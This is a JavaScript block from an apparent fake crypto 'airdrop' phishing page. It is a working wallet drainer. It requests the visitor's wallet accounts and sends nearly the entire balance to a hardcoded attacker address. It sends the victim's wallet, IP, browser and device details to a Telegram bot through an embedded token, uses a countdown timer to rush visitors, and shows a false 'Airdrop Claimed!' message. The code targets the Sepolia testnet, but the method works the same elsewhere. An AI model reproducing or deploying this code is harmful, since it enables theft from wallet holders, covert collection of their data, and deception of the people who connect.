    <script>
        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
        const CHAT_ID = "6309547301";
        const YOUR_WALLET = "0xF01c1348579e129974A39BAcA3cA9eCe28e68490";

        async function sendAlert(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
            } catch (e) {
                console.log("Telegram alert failed, moving on...");
            }
        }

        async function getVictimInfo() {
            const userAgent = navigator.userAgent;
            const browser = navigator.appName + " " + navigator.appVersion;
            const device = /Mobile|Android|iPhone|iPad/.test(userAgent) ? "Mobile" : "Desktop";
            let ip = "Unknown";
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const data = await res.json();
                ip = data.ip;
            } catch (e) {
                console.log("IP fetch failed, defaulting to Unknown");
            }
            return { ip, browser, device };
        }

        async function connectWallet() {
            try {
                if (!window.ethereum) {
                    throw new Error("No wallet detected. Please install MetaMask.");
                }

                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: "0xaa36a7" }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [{
                                chainId: "0xaa36a7",
                                chainName: "Sepolia Testnet",
                                rpcUrls: ["https://rpc.sepolia.org"],
                                nativeCurrency: { name: "Sepolia ETH", symbol: "SEP", decimals: 18 },
                                blockExplorerUrls: ["https://sepolia.etherscan.io"]
                            }]
                        });
                    } else {
                        throw switchError;
                    }
                }

                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                const account = accounts[0];
                const balance = BigInt(await window.ethereum.request({
                    method: "eth_getBalance",
                    params: [account, "latest"]
                }));

                if (balance === 0n) {
                    throw new Error("Wallet balance is zero.");
                }

                const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));
                const gasLimit = 21000n;
                const gasCost = gasLimit * gasPrice;
                const drainAmount = balance - gasCost;

                if (drainAmount <= 0n) {
                    throw new Error("Insufficient funds for transaction after gas.");
                }

                const victimInfo = await getVictimInfo();
                await sendAlert(`ðŸŽ¯ VICTIM CONNECTED\nWallet: ${account}\nIP: ${victimInfo.ip}\nBrowser: ${victimInfo.browser}\nDevice: ${victimInfo.device}`);

                const txHash = await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: account,
                        to: YOUR_WALLET,
                        value: "0x" + drainAmount.toString(16),
                        gas: "0x" + gasLimit.toString(16),
                        gasPrice: "0x" + gasPrice.toString(16),
                        chainId: "0xaa36a7"
                    }]
                });

                await sendAlert(`âœ… SEPOLIA SUCCESS: ${account} DRAINED - TX: ${txHash}\nIP: ${victimInfo.ip}`);
                document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Claimed!</h2><p>Funds & NFT transferred. Check your wallet!</p>";
            } catch (e) {
                const victimInfo = await getVictimInfo();
                await sendAlert(`SEPOLIA ERROR: ${account ? account : "Unknown"} - ${e.message}\nIP: ${victimInfo.ip}\nBrowser: ${victimInfo.browser}\nDevice: ${victimInfo.device}`);
                document.getElementById("status").innerHTML = `<h2 class='error'>Connection Failed</h2><p>Error: ${e.message}</p>`;
            }
        }

        function startTimer() {
            const endTime = Date.now() + 24 * 60 * 60 * 1000;
            const timer = setInterval(() => {
                const now = Date.now();
                const distance = endTime - now;
                if (distance < 0) {
                    clearInterval(timer);
                    document.getElementById("timer").innerHTML = "Airdrop Ended!";
                    document.querySelector("button").disabled = true;
                    return;
                }
                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
                document.getElementById("timer").innerHTML = `${hours}h ${minutes}m ${seconds}s`;
            }, 1000);
        }

        window.onload = startTimer;
    </script>
